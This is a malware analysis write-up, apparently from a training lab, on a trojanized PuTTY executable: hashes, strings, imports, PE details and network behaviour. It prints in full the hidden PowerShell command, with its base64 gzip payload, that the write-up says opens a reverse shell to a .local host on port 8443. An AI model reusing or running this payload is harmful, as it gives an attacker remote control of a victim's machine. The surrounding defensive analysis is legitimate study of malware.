# Basic Static Analysis
## Hashes 

| Type   | hash                                                                                                                             |
| ------ | -------------------------------------------------------------------------------------------------------------------------------- |
| sha256 | 0C82E654C09C8FD9FDF4899718EFA37670974C9EEC5A8FC18A167F93CEA6EE83                                                                 |
| md5    | 334a10500feb0f3444bf2e86ab2e76d                                                                                                  |
| sha512 | 9c85eff62ef12564f02735c58b64c581da7107cd250829ce88cc569c5def675d76da3b538a4a394aa2747c375fe683d629e552c3c279d35d6db8484467a530de |



## Virus Total

### PuTTY

Hash: [0C82E654C09C8FD9FDF4899718EFA37670974C9EEC5A8FC18A167F93CEA6EE83](https://www.virustotal.com/gui/file/0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83)
![[Pasted image 20241207155107.png]]

Family: **Metasploit**
## Floss
### URL
```
https://www.chiark.greenend.org.uk/~sgtatham/putty/

https://github.com/llvm/llvm-project/ ab5ee342b92b4661cfec3cdd647c9a5c18e346dd
```

### Script
![[Pasted image 20241207161920.png]]

```bash
FLOSS.exe putty.exe.malz | findstr powershell
```

```ps1
powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
```

Payload decoded:

![[Pasted image 20241207172015.png]]


the script create a socket TCP client 
on `bonus2.corporatebonusapplication.local`
domain on port `8443`


## PEStudio

### Imports Function
interesting function are:
```
GetDesktopWindow
GetForegroundWindow
GetQueueStatus
GetWindowTextA
GetOverlappedResult
CloseClipboard
EmptyClipboard
GetClipboardData
GetClipboardOwner
OpenClipboard
RegisterClipboardFormatA
SetClipboardData
AllocateAndInitializeSid
CopySid
EqualSid
GetLengthSid
SetSecurityDescriptorDacl
SetSecurityDescriptorOwner
RegCreateKeyA
RegCreateKeyExA
RegDeleteKeyA
RegDeleteValueA
RegEnumKeyA
RegSetValueExA
GetCurrentProcessId
GetEnvironmentVariableA
GlobalMemoryStatus
GetKeyboardState
SetKeyboardState
DeleteFileA
FindFirstFileA
FindNextFileA
MapViewOfFile
UnmapViewOfFile
WriteFile
ShellExecuteA
CreateProcessA
GetCurrentProcess
GetCurrentThread
GetCurrentThreadId
GetThreadTimes
OpenProcess
TerminateProcess
RaiseException
SystemParametersInfoA
SetCurrentDirectoryA
```

### Imports Libraries IAT
```text
GDI32.dll
USER32.dll
COMDLG32.dll
SHELL32.dll
ole32.dll
IMM32.dll
ADVAPI32.dll
KERNEL32.dll
```

#### ADVAPI32.dll
Is a **Advanced Windows 32 Base API**

## PEView

### Architetture

| Acrh                    | HEX        |
| ----------------------- | ---------- |
| Intel 386 (32-bit x86). | **0x014c** |
| x64 (64-bit).           | **0x8664** |
| ARM                     | **0x01c0** |
| ARM64                   | **0xaa64** |
In this case the PE is a 32-bit arch
![[Pasted image 20241207160534.png]]


### Packed
The Malware are **not** packet:

```
Virtual Size HEX:95F6D Decimal:614,253
Size of Data HEX:96000 Decimal:614,400
```
![[Pasted image 20241207154413.png]]

### TimeStamp
The last build malware was in `2021/07/10`.

![[Pasted image 20241207154456.png]]



# Basic Dynamic Analysis
If the are not internet connection the putty malware doesn't start the PowerShell script with payload.
## Network Signature

The DNS query that putty try to contact is `bonus2.corporatebonusapplicationm.local`
![[Pasted image 20241207204234.png]]

the callback protocol at detonation is **SSL\TLS** by the initiation of a CLIENT HELLO message from the detonation to the specified domain
![[Pasted image 20241207204903.png]]


When the malware detonate try to establish connection on `8443` port but was refused because there is no one listener on that port
![[Pasted image 20241207194452.png]]
now try to setup a listener on `8443` port. And the connection was successfully 
![[Pasted image 20241207194956.png]]
On **TcpViewr** we can see the porwehsell.exe process has spawn and connected to `8443` port. 
![[Pasted image 20241207194945.png]]
Infect if wee open tree view in procmon we can see the PowerShell is child process of putty
![[Pasted image 20241207195326.png]]
## Host Base Signature
The putty malware create a process where running in the PowerShell script for a reverse shell
![[Pasted image 20241207201151.png]]


